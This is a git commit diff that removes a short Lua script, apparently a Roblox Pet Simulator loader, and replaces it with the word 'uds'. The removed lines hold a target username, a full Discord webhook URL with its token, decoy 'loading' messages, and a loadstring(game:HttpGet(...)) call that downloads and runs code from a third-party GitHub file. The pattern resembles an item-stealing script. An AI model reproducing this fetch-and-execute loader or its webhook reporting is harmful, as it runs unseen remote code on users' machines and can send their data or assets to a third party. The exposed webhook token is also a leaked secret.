c708bec336fde6d625d52dc81ed0a42103c4fe52
dudead1q3123 <125707074+dudead1q3123@users.noreply.github.com>
2023-02-19 08:17:49 +1000

    what

--- ahd.lua
+++ ahd.lua
@@ -1,9 +1,1 @@
-Username = "Birthlady1234"
-WebHook = "https://discord.com/api/webhooks/1076277915257421865/Ip_1mFeju0CZsp_w_xp8N5wt16aP83VQPg3iF1DWhcUTv0iZQx7lHb3jUyR5NWRDcK7E"
-
-_G.CustomScriptName = "Coen"
-_G.Text1 = "Script Loaded..."
-_G.Text2 = "Waiting for Script"
-_G.Text3 = "Checking Scripts..."
-_G.Text4 = "Starting Scripts..."
-loadstring(game:HttpGet("https://raw.githubusercontent.com/Justanotherdme/petsimx22/main/petsimguiss.lua"))()
+uds
